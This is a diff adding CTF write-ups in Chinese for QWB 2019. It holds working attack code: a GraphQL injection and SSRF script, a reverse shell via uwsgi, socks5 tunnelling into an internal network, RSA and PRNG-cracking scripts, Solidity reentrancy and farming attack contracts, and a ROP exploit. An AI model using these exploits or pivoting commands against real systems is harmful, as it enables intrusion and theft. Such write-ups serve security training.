@@ -7,14 +7,16 @@
 
 # 网上公开WP:
 + https://www.zhaoj.in/read-5873.html
++ https://mp.weixin.qq.com/s/6w9cW4k1m9SjEHyfP_maSg
 + https://altman.vip/2019/05/27/QWB2019-writeup/
 
 # 题目下载：
 + https://github.com/glzjin/qwb_2019_smarthacker
 + https://github.com/glzjin/qwb_2019_upload
++ https://github.com/glzjin/qwb_2019_supersqli
 
 # 本站备份WP
-**感谢作者: Glzjin、Donek1、wu1a、admin-琴里**
+**感谢作者: Glzjin、Donek1、wu1a、admin-琴里、 白帽100安全攻防实验室【公众号同名】**
 ## Web
 ### UPLOAD
 
@@ -714,6 +716,90 @@ if __name__ == '__main__':
 
 ![](https://cy-pic.kuaizhan.com/g3/0f/57/1682-f0d1-45a2-8908-b0ef81f95fc725)
 
+### babywebbb
+**一开始这题都摸不着门路，枯了……
+
+然后day2中午的时候，队友告诉我存在证书泄漏
+
+找到
+
+![](https://p.pstatp.com/origin/fe7d0000cef87e94f9ab)
+
+域名绑定到hosts，就可以访问了，后来才知道,本题nginx做代理时，是与域名绑定的。
+结合一开始发现的rsync的未授权访问获取的源码
+有一个graphQL的API服务存在注入
+
+通过注入获取session后，进一步ssrf
+
+注入+SSRF脚本
+```
+login = "https://qqwwwwbbbbb.52dandan.xyz:8088/graphql_test123/login?query=%7B%0A%20%20recv%20(%0A%20%20%20%20data%3A%22%7B%5C%22operate%5C%22%3A%5C%22login%5C%22%2C%5C%22username%5C%22%3A%5C%22%5C%5C%5C%22or%202%3D2%23%5C%22%2C%5C%22password%5C%22%3A%5C%22%5C%22%7D%22%0A%20%20)%0A%7D"
+s = requests.Session()
+r = s.get(login,verify=False)
+ssrf = "https://qqwwwwbbbbb.52dandan.xyz:8088/user/newimg"
+data = {
+    "newurl":sys.argv[1]
+}
+r = s.post(ssrf,verify=False,data=data,timeout=5)
+print(base64.b64decode(r.content))
+```
+可以发现发现
+
+![](https://p.pstatp.com/origin/fffc00001b3252e6e2f2)
+
+存在uwsgi
+
+用uwsgi的命令执行脚本进行修改，将gopher语句输出后，通过ssrf打127.0.0.1:3031
+
+![](https://p.pstatp.com/origin/ff9a000082a248bd1225)
+
+成功反弹shell
+
+![](https://p.pstatp.com/origin/fee3000039417746fc6f)
+
+根据提示socks5，通过扫描发现172.16.17.4开发1080端口。在内网机器上使用ew进行代理
+
+`./ew_for_linux64 -s lcx_slave -d 0.0.0.0 -e 4000 -f 172.16.17.4 -g 1080`
+
+自己的公网服务器执行
+
+`./ew_for_linux64 -s lcx_listen -l 1089 -e 4000`
+
+通过反代出来的socks5进内网
+
+![](https://p.pstatp.com/origin/fea5000063baeb6ff06b)
+
+代码审计给出的代码https://paste.ubuntu.com/p/q4xJBfm3Bb/
+
+![](https://p.pstatp.com/origin/dc0b0006364e12a090d1)
+
+回溯func waf
+
+![](https://p.pstatp.com/origin/dc0e0002ddfc05d14bf1)
+
+log记录数据
+
+![](https://p.pstatp.com/origin/ff4d000053d013b9c22b)
+
+存在任意文件写
+回溯saveall
+
+![](https://p.pstatp.com/origin/feff00003de1012b10d3)
+
+同时session类里有调用了pickle.load，因此存在反序列化
+
+题目又关了
+
+因此可能的执行流程为（讲道理应该可以，测试不了了233333
+
+构造反序列化payload 
+
+```
+User 1 -> POST /adduser username=payload&password=
+User 1 -> /savelog 修改 User2 session
+User 2 -> 登录触发反序列化
+User 2 -> getflag**
+```
 
 ## MISC
 ### 签到
@@ -763,7 +849,489 @@ game.gb（附件）应该就是游戏了，下载下来，百度搜了一下是G
  
 ![](https://cy-pic.kuaizhan.com/g3/44/23/4053-9117-4483-b482-613868ef248e96)
 
+### 强网先锋-打野
+附件下载后直接通过zsteg解
+
+![](https://p.pstatp.com/origin/ffc7000027066e11d9a3)
+
 ## Crypto
+
+### Randomstudy
+第一层，和服务器同步时间种子就可以了。
+
+第二层，分析 SDK的 Random 函数。
+
+![](https://p.pstatp.com/origin/ff3a00001e8ecae73140)
+
+![](https://p.pstatp.com/origin/fe2a0000b18830fb3493)
+
+随机数是以 `seed0x5deece66d + 0xb &((1<<48)-1)` 循环的形式生成伪随机数的，只需要爆破得到低16位即可 就是 `0-0xffff`。
+
+写脚本即可爆破，后来因为python 加了一个0xfffffff和脚本有点出入 可能有概率出不了解。懒得修改直接上。
+
+```
+import java.io.PrintStream;
+import java.util.Random;
+import java.util.concurrent.atomic.AtomicLong;
+
+
+public class test
+{
+
+    public static long nextSeed(long seed){
+        return ((seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1)) ;
+    }
+
+    public static int getNextInt(long seed, long bits ){
+        return (int)(seed >>> (48 - bits));
+    }
+
+    public static void main(String[] paramArrayOfString)
+    {
+
+        long t1 = Long.parseLong(paramArrayOfString[0]);
+        long t2 = Long.parseLong(paramArrayOfString[1]);
+
+        for(int i=0; i< 0x10000; i++){
+            if( t2 == getNextInt(nextSeed((t1 << 16) + i), 32)){
+                // System.out.println("find:");
+                // System.out.println(getNextInt(nextSeed((t1 << 16) + i), 32));
+                System.out.println(getNextInt(nextSeed(nextSeed((t1 << 16) + i)),32));
+
+            }
+        }
+
+    }
+}
+```
+第三层
+套用randcrack即可
+```
+import hashlib
+import random
+import time
+import subprocess
+
+from randcrack import RandCrack
+
+from pwn import *
+
+def proof(skr, skr_sha256):
+    for c1 in range(0x100):
+        for c2 in range(0x100):
+            for c3 in range(0x100):
+                shr = skr + chr(c1)+ chr(c2)+ chr(c3)
+                # print hashlib.sha256(shr).hexdigest()
+                if hashlib.sha256(shr).hexdigest() == skr_sha256.strip().lower():
+                    print shr.encode("hex")
+                    return shr.encode("hex")
+
+def one(p, t):
+    random.seed(t)
+    randintdata = str(random.randint(0,2**64))
+    print "Try: ", randintdata
+    p.sendline(randintdata)
+    i = -10
+    time_num = 1
+    data = p.recvline()
+    print data
+
+    while "fail" in data:
+        time_num += 1
+        random.seed(t + i)
+
+        for x in range(time_num):
+            randintdata = str(random.randint(0,2**64))
+
+        print "Try: ", randintdata
+        p.sendline(randintdata)
+
+        i += 1
+        data = p.recvline()
+
+        if i == 8:
+            print "attack fail!"
+            exit()
+
+def second(p, x1, x2):
+    x1 = x1.strip()
+    x2 = x2.strip()
+    print x1,x2
+    o = subprocess.check_output(["/usr/lib/jvm/jdk-12.0.1/bin/java", "test", x1, x2])
+
+    while len(o.split('\n')) == 1:
+        p.sendline("1")
+        p.recv()
+        print p.recvuntil("[-]")
+        data1 = p.recvuntil("\n").strip()
+        p.recvuntil("[-]")
+        data2 = p.recvuntil("\n").strip()
+        o = subprocess.check_output(["/usr/lib/jvm/jdk-12.0.1/bin/java", "test", data1, data2])
+
+    print "output:", o.split('\n')
+
+    p.sendline(o.split('\n')[0])
+    p.recv()
+
+def third(p):
+
+    rc = RandCrack()
+    for i in range(624):
+        p.sendline("1")
+        oneline = p.recvline()
+        print i, int(oneline[10:-1])
+        this_num = int(oneline[10:-1])
+        rc.submit(this_num)
+        p.recvuntil('[-]')
+    this_num =  rc.predict_randrange(0, 4294967295)
+
+    p.sendline(str(this_num))
+    print p.recv()
+    print p.recv()
+    print p.recv()
+
+
+def attack():
+    p = remote("119.3.245.36", 23456)
+    p.recvuntil("hexdigest()=")
+    skr_sha256 = p.recvuntil("\n")
+    p.recvuntil("('hex')=")
+    shr5 = p.recvuntil("\n").strip().decode("hex")
+    p.recv()
+    p.sendline(proof(shr5, skr_sha256))
+    p.recv()
+    p.sendline("bfdccbebf86687951f6d37b3e5a35fe1")
+
+    p.recv()
+    p.recv()
+    one(p, int(time.time()))
+    # print p.recvuntil("[-]")
+    print p.recvuntil("[-]")
+    data1 = p.recvuntil("\n")
+    p.recvuntil("[-]")
+    data2 = p.recvuntil("\n")
+
+    second(p, data1, data2)
+    print p.recv()
+    p.recv()
+    third(p)
+attack()
+```
+### copperstudy
+```
+[+]Generating challenge 1
+
+[+]n=0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953L
+[+]e=3
+[+]m=random.getrandbits(512)
+[+]c=pow(m,e,n)=0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1L
+[+]((m>>72)<<72)=0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000L
+
+# 70841b8fe11fd1872e
+# 9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b70841b8fe11fd1872eL
+```
+密文高位已知 网上找脚本直接跑
+```
+e = 0x3
+b = 0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000L
+n = 0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953L
+c=0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1L
+kbits=72
+PR.<x> = PolynomialRing(Zmod(n))
+f = (x + b)^e-c
+x0 = f.small_roots(X=2^kbits, beta=1)[0]
+print "x: %s" %hex(int(x0))
+```
+```
+[+]Generating challenge 2
+[+]n=0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dL
+[+]e=65537
+[+]m=random.getrandbits(512)
+[+]c=pow(m,e,n)=0x1922e7151c779d6bb554cba6a05858415e74739c36df0bcf169e49ef0e566a4353c51a306036970005f2321d1d104f91a673f40944e830619ed683d8f84eaf26e7a93c4abe1dbd7ca3babf3f4959def0e3d87f7818d54633a790fc74e9fed3c5b5456c21e3f425240f6217b0b14516cb59aa0ce74b83ca17d8cc4a0fbc829fb8L
+[+]((p>>128)<<128)=0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000L
+```
+p高位已知，低位未知。和2017年国赛的那个rsa一样。
+```
+n = 0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dL
+p_fake = 0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000L
+
+pbits = 1024
+kbits = 130
+pbar = p_fake & (2^pbits-2^kbits)
+print "upper %d bits (of %d bits) is given" % (pbits-kbits, pbits)
+
+PR.<x> = PolynomialRing(Zmod(n))
+f = x + pbar
+
+x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root < 2^kbits with factor >= n^0.3
+print hex(int(x0 + pbar))
+# output :  0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a87321efe89ec89bdf3e4d9da9a45df22a787L
+```
+```
+[+]Generating challenge 3
+
+[+]n=0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL
+
+[+]e=3
+[+]m=random.getrandbits(512)
+[+]c=pow(m,e,n)=0x3d7e16fd8b0b1afdb4e12594c3d8590f1175800ef07bb275d7a8ad983d0d5d5fd5c6f81efa40f5d10c48bb200f805e679d633ee584748e5feef003e0921dea736ba91eef72f3d591d3a54cd59fd36f61140fdd3fb2e2c028b684e50cbeae4a1f386f6ab35359d46a29996c0f7d9a4a189f1096150496746f064c3cc41cf111b0L
+[+]d=invmod(e,(p-1)*(q-1))
+[+]d&((1<<512)-1)=0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL
+[-]long_to_bytes(m).encode('hex')=
+d = 0x36a7780f1c08f66d7563a8fdbae2401c4e5eb8d97452b056fcadde216b2d6fd27abbbf38a37b7e742d4ab7cf04cc6f03e9fd64dbaa060c85af51a55ea733fd2017c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL
+```
+已知低位的密钥和N。Partial Key Exposure Attack(部分私钥暴露攻击)
+```
+def partial_p(p0, kbits, n):
+    PR.<x> = PolynomialRing(Zmod(n))
+    nbits = n.nbits()
+    f = 2^kbits*x + p0
+    f = f.monic()
+    roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.3)  # find root < 2^(nbits//2-kbits) with factor >= n^0.3
+    if roots:
+        x0 = roots[0]
+        p = gcd(2^kbits*x0 + p0, n)
+        return ZZ(p)
+
+
+def find_p(d0, kbits, e, n):
+    X = var('X')
+
+
+    for k in xrange(1, e+1):
+        results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits)
+        for x in results:
+            p0 = ZZ(x[0])
+            p = partial_p(p0, kbits, n)
+            if p:
+                return p
+
+
+if __name__ == '__main__':
+    # n = 0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL
+    e = 3
+    # d = 0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL
+
+    n = 57569201048993475052349187244752169754165154575782760003851777813767048953051839288528137121670999884309849815765999616346303792471518639080697166767644957046582385785721102370288806038187956032505761532789716009522131450217010629338000241936036185205038814391205848232364006349213836317806903032515194407739
+    nbits = n.nbits()
+    kbits = floor(nbits*0.5)
+    print "kbits : ", kbits 
+    d0 = 1244848677959253796774387650148978357579294769878147704641867595620534030329181934099194560059806799908134954814673426128260540575360296026444649631806619
+    print "lower %d bits (of %d bits) is given" % (kbits, nbits)
+
+    p = find_p(d0, kbits, e, n)
+    print "found p: %d" % p
+    q = n//p
+    # print d
+    print inverse_mod(e, (p-1))
+```
+```
+[+]Generating challenge 4
+[+]e=3
+[+]m=random.getrandbits(512)
+
+[+]n1=0x4b25bd834da788533ebef06f552bc8230024d1a571226770bd93bad3b202af4de7f680252a61cc423b3143db075196d6c282e71e84a3f3fe582c69c822389ddf76a86f9169334868119a884b8185c4ee559a3540141c785f2a9e1d59e3c828b26fc785ae4b578da073a39000fbaca6f30807a6110079dc64693dd1089835ea0bL
+
+[+]c1=pow(m,e,n1)=0x5e6a4b86018060a6c38952cfd450695ca90444c51d4e0de4690dbadd5000f7bb62e752bbd70c27f342792cc669f0d650b0c8e31b233963c32ebc2297d5aae650a8be7ba5a49319cc010ea8333de09fb4ae9e25af4cce79afcaad80263fbb02329dadb49bfb5f87791c9d29e52103f0153a200f7a11b00086c3c7ae6bbc30269L
+
+[+]n2=0x2388ddafc70ba72e181857376f3b23bf6b95c5f721a05e5e499caed0ee81a40031223718156752eef2c7535d8d8d0224126975492f8f002ca98d923ba3f05bff14eac24fb35dd50683cadc3ae0fa55ac368ebe5eb4ecfeb48ada4d785d7c64524783ef50a7c599a27b6a2afa9e1c1a41c6aba40dfd316eef4dc6718eba2af1c5L
+
+[+]c2=pow(m,e,n2)=0x71c907c67faf78314ff0332a7fe1d23fd6c9d788425affd54b851c805327fe363c340b047b555f356b1d8b6a930cb22a2e2eb3eb492ab4b307bc782c34fe1dfd032a2d838a80fbf8f6990baa4c712bc9f3bcae964806d418301cd25bc35c0d07a3fc24b25ecc527d3bfafaa5c6ffcf171446238925a76039a2aadc557efb871L
+
+[+]n3=0x33e9cbd05b84dc1e5d314656c937c2225351bd0573a5d2d8db357db8afb65be91b0362f8c1b9bbaab51c23decfff77cf8160e260c3374c2fd5b69d1a64cdddb5bd6e37e049e4a657d4a239177b9ec23a873ae272861567b8ea000880d0ba8e7f0449de97f955a78e78e7c8a3becbf3adb6825326786d98ecc30d34be67b5be69L
+
+[+]c3=pow(m,e,n3)=0x37bf32f9bfd3afc668b2fb4f48ab3e888bbc204eda2dd05af8dc08974698aa7808cb8623ee16cb17ccc9e27de90d283569390f1ea155a645e46a47f4a1c147d139b631219a94ea3fcac314515a112c7e673ddf594482eec00c0ec8c46dbf4bc4532c19a5dcdbc0a1c8882937b5546653e73c047473df8aa350d876c7a62f60fL
+[-]long_to_bytes(m).encode('hex')
+```
+用中国剩余定律算下就可以了。
+```
+[+]Generating challenge 5
+
+[+]n=0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93L
+
+[+]e=3
+[+]m=random.getrandbits(512)
+[+]c=pow(m,e,n)=0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cL
+[+]x=pow(m+1,e,n)=0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eL
+计算公式 (m+1)^3 - m^3 = c2-c1 3m^2+3m+1=c2-c1 计算delta
+
+import gmpy2
+n=0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93L
+c1=0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cL
+c2=0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eL
+e=3
+for i in range(0,99999):
+    c=1-n*i+(c1-c2)
+    if(9-12*c)>0:
+        if ((gmpy2.iroot(9-12*c,2)[0]-3)%6==0):
+            m=(gmpy2.iroot(9-12*c,2)[0]-3)/6
+            if pow(m,e,n)==c1:
+                print m
+[+]Generating challenge 6
+[+]n=0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L
+[+]d=random.getrandbits(1024*0.270)
+[+]e=invmod(d,phin)
+[+]hex(e)=0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL
+[+]m=random.getrandbits(512)
+[+]c=pow(m,e,n)=0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL
+[-]long_to_bytes(m).encode('hex')=
+```
+Boneh and Durfee attack.
+
+用这个脚本 https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sagexx
+
+### BABYBANK
+我们通过合约地址进行逆向得到合约的逆向代码(https://ethervm.io/decompile/)
+
+![](https://p.pstatp.com/origin/ff1a0000325aa8535915)
+
+由代码分析我们得出代码中的关键函数分别为：guess、profit、transfer、withdraw。 且合约中存在两个关键变量：balance（余额）以及level（一种标记）。
+
+在审计合约之后我们发现 profit函数：每个账户只允许调用一次，并发送钱包1 token；
+
+guess函数需要level值为1且调用后余额+1、leve+1 ；
+
+而transfer函数满足必须balance与level同时为2才能调用，且调用后收款方余额变为2，且转账方余额变为0 ；
+
+withdraw函数表示取款，且合约会将以太币转给msg.sender。
+
+然而漏洞点就在withdraw中。熟悉区块链的人都知道此处使用.call方法进行转账，而这种方法会调用收款方的fallback函数，从而引发重入攻击。
+
+于是我们利用此来进行攻击。我们还看到withdraw中还存在如下方法：
+
+![](https://p.pstatp.com/origin/dc110001bcf601941da9)
+
+当存在减法且没有判断时，我们就可以认定这里存在溢出，然而要满足溢出条件需要storage[temp2]<temp1。可是前面代码加了判断，所以我们需要在中间调用.call时进行对余额的操作从而让其减小。 我们可以在合约调用如下句子的时候调用收款人的fallback函数从而再次执行withdraw，加入合约余额为2，转账金额设置为2。而在中间进行调用可以很好的绕过余额的检测，从而达成2-2-2的情况，从而溢出。
+
+贴上攻击合约
+
+```
+contract hack{
+    babybank a;
+    uint count = 0;
+    event log(uint256);
+    constructor(address b)public{
+        a = babybank(b);
+    }
+    function () public payable {
+        if(count==2){
+            log(3);
+        }else{
+            count = count + 1;
+      a.withdraw(2);
+        log(1);
+        }
+    }
+    function getMoney() public payable{}
+
+    function hacker() public{
+        a.withdraw(2);
+        log(2);
+    }
+    function payforflag1(string md5ofteamtoken,string b64email) public{
+        a.payforflag(md5ofteamtoken,b64email);
+    }
+
+    function kill() {
+
+      selfdestruct(0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c);
+    }
+
+}
+```
+
+![](https://p.pstatp.com/origin/1372f0000096f60559332)
+
++ 1 由于合约本身没有以太币，所以我们先生成合约A调用自杀函数给题目转钱。
++ 2 进行转账操作，我们使用账户B分别调用profit()、guess()、transfer()给C账户转2token。
++ 3 当C有了2token便可以进行攻击，调用hacker函数即可。
+
+PS：由于合约需要前四位为“b1b1”的账户，所以我们需要https://vanity-eth.tk/来生成相应的账户B。
+
+![](https://p.pstatp.com/origin/ffd7000024c4f3d3c8d9)
+
+调动成功后在邮箱收到flag
+
+![](https://p.pstatp.com/origin/dc0f0002c9aa78189400)
+
+
+### babybet
+给了部分合约代码
+```
+pragma solidity ^0.4.23;
+
+contract babybet {
+    mapping(address => uint) public balance;
+    mapping(address => uint) public status;
+    address owner;
+
+    //Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.
+    //Gmail is ok. 163 and qq may have some problems.
+    event sendflag(string md5ofteamtoken,string b64email); 
+
+    constructor()public{
+        owner = msg.sender;
+        balance[msg.sender]=1000000;
+    }
+
+    //pay for flag
+    function payforflag(string md5ofteamtoken,string b64email) public{
+        require(balance[msg.sender] >= 1000000);
+        if (msg.sender!=owner){
+        balance[msg.sender]=0;}
+        owner.transfer(address(this).balance);
+        emit sendflag(md5ofteamtoken,b64email);
+    }
+
+    modifier onlyOwner(){
+        require(msg.sender == owner);
+        _;
+    }
+```
+
+逆向合约，得到关键函数：profit、bet、func_048F（转账函数）。 发现此问题相比上一道题利用方法更为简单。首先调用profit函数获得空投10 token。 之后进入bet函数，而bet函数有如下判断：首先余额要>=10 、status要小于2、传入的参数要与随机数相同，之后便会给与此账户1000代币，并将status改为2 。 于是我们的函数调用顺序为：创建新合约账户A，调用profit、预测随机数调用guess、调用转账函数汇总token。 合约要求代币要>1000000，所以上述薅羊毛过程需要重复1000次，并汇总到一个账户中。 具体合约如下：
+```
+contract midContract {
+    babybet target = babybet(0x5d1BeEFD4dE611caFf204e1A318039324575599A);
+
+    function process() public {
+        target.profit();
+        bytes32 guess = block.blockhash(block.number - 0x01);
+        uint guess1 = uint(guess) % 0x03;
+        target.bet(guess1);
+
+    }
+        function transfer(address a, uint b) public{
+        // target.func_048F(a,b);
+        bytes4 method = 0xf0d25268;
+        target.call(method,a,b);
+        selfdestruct();
+    }
+}
+
+contract hack {
+    // babybet target; = babybet(0x5d1BeEFD4dE611caFf204e1A318039324575599A);
+
+
+function ffff() public {
+     for(int i=0;i<=20;i++){
+            midContract mid = new midContract();
+            mid.process();
+            mid.transfer("0x9b9a30b7df47b9dbe0ec7d4bd52aaae4465f2ebe",1000);
+        }
+    }
+}
+```
+每次生成新合约，循环20次，所以此合约执行50次即可。记得将gas limit调大。 预测十分简单，即使用一下语句即可
+
+![](https://p.pstatp.com/origin/fe4e0000aff3baa804ac)
+
+![](https://p.pstatp.com/origin/fe2f00007632ad0c0539)
+
+调用后拿到flag
+
+![](https://p.pstatp.com/origin/ff270000714e9408fa68)
+
 ### 强网先锋-辅助
 
 由题意可知两个n有共同的素数，用辗转相除法求出这个素数p，在用n//p得到q即可根据rsa解密公式求出明文：
@@ -1400,7 +1968,404 @@ public class exp
 
 ![QQ20190525-203240\@2x.png](https://cy-pic.kuaizhan.com/g3/bc/94/dae6-672f-4f8f-a44e-af0e1e9d6b0651)
 
+### xxwarmup
+十分恶心的一道题，sub_80483DB存在栈溢出，难点就在ROP怎么做了，思路就是通过部分改libc_start_main（可以通过sub_80483DB去做），然后再一个ret或者jmp过去，难点是远程开启了aslr这个地址随机了，所以要碰撞一下，概率应该为1/(2^24)（可以先本地关了aslr去做，就不用爆破了）。然后尝试过程如下：
+
++ 尝试改写为one_gadget，结果8个没有一个成功（虽然后面发现不能拿shell）
++ 尝试改system传/bin/sh，发现在system内有一个抬高栈的操作sub esp, 0x15c，这样esp就指向了不可写的区域，而我们最高能控制到0x40+0x80的地方。就是说sub后一定会到不可以写区域，凉凉
++ 尝试syscall去做，结果edx没gadget，全是call edx，卒
++ 回过头来去改payload，用sub_80483DB把栈复制到0x500高处，然后再把esp改过去，再执行system，然后本地可以/bin/sh了。
++ 然后开启多进程去碰撞远程发现不行，回去看pow.py，发现只能在最开始接收一次输入，然后在输出一次就没了，而且大小都是0x100限制了。
++ 在尝试‘cat *\x00’，可以通过报错发现目录，很长，，，，。因为一开始payload构造的太长了，只剩下8字节放命令，而cat */也不能输出（猜测因为这样先匹配了bin/）
+
+回去重构整个payload，把可以放命令的空间提高到了40字节，然后使用命令'cat _the_flag_dir_name_you_shold_guess/*\x00'，在多进程下碰撞了半天后，成功得到了flag。
+
+```
+#-*- coding: utf-8 -*-
+from pwn import *
+from hashlib import *
+from multiprocessing import Process
+
+# bp 0x8048519
+context.log_level = "error"
+
+def gen(one):
+    _copy = 0x080483db
+    _esp = 0x0804a040
+    _libc_start = 0x0804a00c
+    ppp_ret =  0x08048619
+    pop_ebp = 0x08048518
+
+    rop = ''
+    rop += p32(_copy) + p32(ppp_ret) + p32(_libc_start)  + p32(_esp+(13*4)) + p32(3)
+    rop += p32(_copy) + p32(ppp_ret) + p32(_esp+0x500-0x44)  + p32(_esp+0x44) + p32(0x40)
+    rop += p32(pop_ebp) + p32(_esp+0x500-0x44)
+    rop += p32(0x08048512)
+    rop += p32(one)
+    rop += 'A' * (0x40 - len(rop) )
+
+    rop += p32(0x0804a044)
+    rop += p32(_esp+0x500-0x40)
+    rop += p32(0x080482c0) * 2
+    rop += p32(0)
+    rop += p32(_esp+0x510-0x40)
+    rop += 'cat _the_flag_dir_name_you_shold_guess/*\x00'
+
+    # print len(rop.encode('hex'))
+    # print rop.encode('hex')
+    return rop.encode('hex')
+
+# gen(0xf7e29200)
+
+def pow(io):
+    chal = io.recvuntil('\n',drop=True)
+    return iters.mbruteforce(lambda x: sha256(chal + x).hexdigest().startswith('00000'), string.letters+string.digits, 4, 'fixed')
+
